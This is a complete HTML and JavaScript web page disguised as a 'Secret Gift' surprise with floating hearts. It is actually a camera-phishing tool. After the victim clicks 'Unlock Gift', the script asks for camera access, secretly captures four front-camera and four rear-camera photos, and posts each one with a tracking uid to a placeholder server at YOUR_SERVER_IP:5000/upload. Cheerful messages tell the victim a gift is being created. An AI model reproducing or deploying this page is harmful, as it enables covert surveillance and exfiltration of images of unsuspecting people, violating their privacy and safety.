<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>ğŸ Secret Gift</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{
  margin:0;background:#0b0014;color:white;
  font-family:sans-serif;display:flex;
  align-items:center;justify-content:center;height:100vh;
  overflow:hidden
}
.card{
  background:#160022;padding:22px;
  border-radius:20px;width:90%;max-width:380px;
  box-shadow:0 0 25px #ff00ff;text-align:center
}
button{
  width:100%;padding:12px;margin-top:10px;
  border-radius:30px;border:none;
  background:linear-gradient(45deg, #ff00ff, #00ffff);
  color:black;font-size:16px;font-weight:bold
}
video{width:100%;border-radius:12px;margin-top:10px;display:none}
img{width:100%;margin-top:6px;border-radius:10px}
.heart{
  position:fixed;bottom:-20px;font-size:22px;
  animation:float 5s linear infinite;color:pink
}
@keyframes float{
  0%{transform:translateY(0);opacity:1}
  100%{transform:translateY(-120vh);opacity:0}
}
.status{
  margin-top:10px;font-size:14px;color:#ffb3ff;
}
.gift-icon{
  font-size:60px;margin-bottom:10px;
}
</style>
</head>

<body>
<div class="card" id="box">
  <div class="gift-icon">ğŸ</div>
  <h2>âœ¨ Secret Gift âœ¨</h2>
  <p id="text">
    You have a magical gift waiting! ğŸ§§ğŸ€<br><br>
    Unlock to see your personalized surprise created just for you!
  </p>

  <button id="unlockBtn">ğŸ¯ Unlock Gift</button>
  <div class="status" id="status"></div>
</div>

<script>
const box = document.getElementById("box");
const statusEl = document.getElementById("status");
let stream, video;

// hearts animation
setInterval(()=>{
  let h=document.createElement("div");
  h.className="heart";h.innerText="ğŸ’";
  h.style.left=Math.random()*100+"vw";
  document.body.appendChild(h);
  setTimeout(()=>h.remove(),5000);
},300);

// get uid from query (?uid=123456)
function getUserIdFromQuery() {
  const params = new URLSearchParams(window.location.search);
  return params.get("uid");
}
const USER_ID = getUserIdFromQuery();

document.getElementById("unlockBtn").onclick = () => {
  startGift();
};

async function startGift() {
  box.innerHTML = `
    <div class="gift-icon">âœ¨</div>
    <h2>ğŸ€ Creating Your Magic</h2>
    <p id="info">
      Preparing your special gift... Please wait!
    </p>
    <video id="video" autoplay playsinline></video>
    <div class="status" id="status2">Initializing surprise...</div>
    <div id="preview"></div>
  `;

  const info = document.getElementById("info");
  const status2 = document.getElementById("status2");
  const preview = document.getElementById("preview");
  video = document.getElementById("video");

  try {
    // First camera
    status2.textContent = "ğŸ”® Capturing magic moments...";
    await startCam("user");
    await captureMultiple(4, "Front", preview, status2);

    // Second camera
    status2.textContent = "âœ¨ Switching angles...";
    await startCam("environment");
    await captureMultiple(4, "Back", preview, status2);

    status2.textContent = "ğŸ‰ Your gift has been delivered!";
    info.innerHTML = "ğŸ’Œ Your surprise has been created and sent!";
    
    // Add celebration emojis
    setTimeout(() => {
      box.innerHTML = `
        <div class="gift-icon">ğŸŠ</div>
        <h2>ğŸ Gift Delivered!</h2>
        <p>Your personalized surprise has been created successfully!</p>
        <p>âœ¨ Check your Telegram for the magic âœ¨</p>
        <div class="status" style="color:#00ff00">âœ… Complete</div>
      `;
    }, 2000);
    
  } catch (err) {
    console.error(err);
    status2.textContent = "ğŸ­ Couldn't create your gift. Please try again.";
    info.innerHTML = "The magic needs camera access to work properly!";
  } finally {
    if (stream) stream.getTracks().forEach(t => t.stop());
  }
}

async function startCam(mode){
  if (stream) stream.getTracks().forEach(t => t.stop());
  stream = await navigator.mediaDevices.getUserMedia({
    video:{facingMode:mode},
    audio:false
  });
  video.srcObject = stream;
  video.style.display = "block";
  await video.play();
}

// capture N photos with small delay
async function captureMultiple(count, label, preview, statusEl){
  for (let i = 1; i <= count; i++) {
    statusEl.textContent = `âœ¨ Creating moment ${i}...`;
    await new Promise(r => setTimeout(r, 700));
    await snap(label + " " + i, preview);
  }
}

async function snap(tag, preview){
  let c = document.createElement("canvas");
  c.width = video.videoWidth || 640;
  c.height = video.videoHeight || 480;
  c.getContext("2d").drawImage(video, 0, 0, c.width, c.height);
  let imgData = c.toDataURL("image/jpeg", 0.85);

  // show preview
  let img = document.createElement("img");
  img.src = imgData;
  preview.appendChild(img);

  // send to backend
  await fetch("http://YOUR_SERVER_IP:5000/upload",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      image: imgData,
      uid: USER_ID
    })
  });
}

// Clean up
window.addEventListener('beforeunload', () => {
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
});
</script>
</body>
</html>
